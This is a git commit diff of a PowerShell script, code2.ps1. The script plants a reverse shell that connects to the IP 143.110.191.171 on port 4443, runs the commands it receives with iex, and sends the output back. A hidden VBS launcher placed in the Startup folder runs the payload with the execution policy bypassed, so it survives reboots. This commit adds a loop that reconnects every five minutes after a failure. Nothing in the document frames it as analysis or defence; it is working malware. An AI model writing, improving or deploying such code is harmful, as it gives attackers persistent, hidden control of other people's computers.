9621c04fe809938324abb4d4da6ffb1e07152383
tanishqDevx <tanishqjain000111@gmail.com>
2025-09-22 20:48:59 +0530

    Update code2.ps1

--- code2.ps1
+++ code2.ps1
@@ -1,14 +1,20 @@
-# Paths
 $programsPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs"
 $startupPath  = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
 $ps1Path = Join-Path $programsPath "code2.ps1"
 $ps1Content = @'
 $sm = (New-Object Net.Sockets.TCPClient('143.110.191.171',4443)).GetStream()
 [byte[]]$bt = 0..65535 | % {0}
-while (($i = $sm.Read($bt, 0, $bt.Length)) -ne 0) {
-    $d = (New-Object Text.ASCIIEncoding).GetString($bt, 0, $i)
-    $st = ([Text.Encoding]::ASCII).GetBytes((iex $d 2>&1 | Out-String))
-    $sm.Write($st, 0, $st.Length)
+while ($true) {
+    try {
+        while (($i = $sm.Read($bt, 0, $bt.Length)) -ne 0) {
+            $d = (New-Object Text.ASCIIEncoding).GetString($bt, 0, $i)
+            $st = ([Text.Encoding]::ASCII).GetBytes((iex $d 2>&1 | Out-String))
+            $sm.Write($st, 0, $st.Length)
+        }
+    } catch {
+        Start-Sleep -Seconds 300
+        $sm = (New-Object Net.Sockets.TCPClient('143.110.191.171',4443)).GetStream()
+    }
 }
 '@
 
@@ -23,7 +29,6 @@ psScript = appData & "\Microsoft\Windows\Start Menu\Programs\code2.ps1"
 cmd = "powershell.exe -ExecutionPolicy Bypass -File """ & psScript & """"
 objShell.Run cmd, 0, False
 '@
-
 
 Set-Content -Path $vbsPath -Value $vbsContent -Force
 $cscript = "cscript.exe //nologo `"$vbsPath`""
